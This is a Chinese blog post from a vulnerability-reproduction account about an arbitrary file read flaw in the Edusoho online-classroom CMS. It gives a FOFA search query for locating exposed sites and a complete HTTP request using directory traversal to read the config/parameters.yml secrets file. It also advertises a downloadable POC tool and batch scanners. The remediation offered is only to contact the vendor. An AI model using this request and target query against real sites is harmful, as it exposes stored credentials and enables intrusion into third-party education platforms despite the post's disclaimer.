#  Edusoho网络课堂cms存在任意文件读取漏洞 附POC软件   
南风徐来  南风漏洞复现文库   2024-02-24 23:08  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. Edusoho网络课堂cms简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
Edusoho网络课堂是面向个人、学校、培训机构及企业用户的友好、开源、高性价比的在线教育建站系统。  
## 2.漏洞描述  
  
Edusoho网络课堂是面向个人、学校、培训机构及企业用户的友好、开源、高性价比的在线教育建站系统。Edusoho网络课堂存在任意文件读取漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
Edusoho网络课堂cms  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bgr1tXYKQiaBVQbPFhP7U8k233cOoYObZPYg3QeryF3HbM8T7jjfI8TibGTNiacJt8HOakX6cQnkUCA/640?wx_fmt=jpeg&from=appmsg "null")  
  
Edusoho网络课堂cms存在任意文件读取漏洞  
## 4.fofa查询语句  
  
title="EduSoho"  
## 5.漏洞复现  
  
漏洞链接：https://127.0.0.1/export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml  
  
漏洞数据包：  
```
GET /export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: Keep-Alive
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=6hjpl1c6pvu8i0uln8cr6niv77
Upgrade-Insecure-Requests: 127
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bgr1tXYKQiaBVQbPFhP7U8kuibIWbh5GEm5UeMe7PeVaLE2E1aFmJvY9bCU7XKwh3ZtAtpWOQvuNicQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现104 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bgr1tXYKQiaBVQbPFhP7U8kU0WW6iaUmJnUmHiasqy0Y4brG6IbNfjBvdYeNTAgI8DrjKhVqfbk4qow/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bgr1tXYKQiaBVQbPFhP7U8kq60gkSgeymaPHhFdWqvs37Qya4LqHFRmXSUt3cJL7FicTnmwZibQ6bRQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bgr1tXYKQiaBVQbPFhP7U8kTncC0Wk7WxG6lRI8Ux2tOFVuqejwtVVyTx0h2OQkUAKfXh6nxcLhEA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bgr1tXYKQiaBVQbPFhP7U8khKkEKfHxgRyZsvZUHm5yg3XibwUh3TzJSBwiaFATNh0KibO1bLnB7nBDQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bgr1tXYKQiaBVQbPFhP7U8k46nB5CyVzVFe9ZMicPjYAhEKIOq0MQE1tuuwbTs1ibyv4ibl5tkmjnOFg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bgr1tXYKQiaBVQbPFhP7U8kEK7KWC0Jbr4oHXfxrtlnw57Ft3TichqGGroNvujoMvxvyq8Ym0aMXaA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
请联系厂商更新补丁：https://www.edusoho.com/  
## 8.往期回顾  
  
[WordPress的Bricks主题存在远程命令执行漏洞CVE-2024-25600 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485348&idx=1&sn=f8fa0576b9bb01bd97a1b95ad844e70d&chksm=974b8aa3a03c03b5ed99651d783895f6110a653c7af1181b6e18dea8da26327281fe1d7fd17e&scene=21#wechat_redirect)  
  
  
[用友U8-OA协同工作系统doUpload.jsp接口存在任意文件上传漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485320&idx=1&sn=2958c0f06328b36f2bab443697ae07ef&chksm=974b8a8fa03c039946f61ec067ca5399568bbf38d914733eb26c6844ed8518eba757345acd14&scene=21#wechat_redirect)  
  
  
  
  
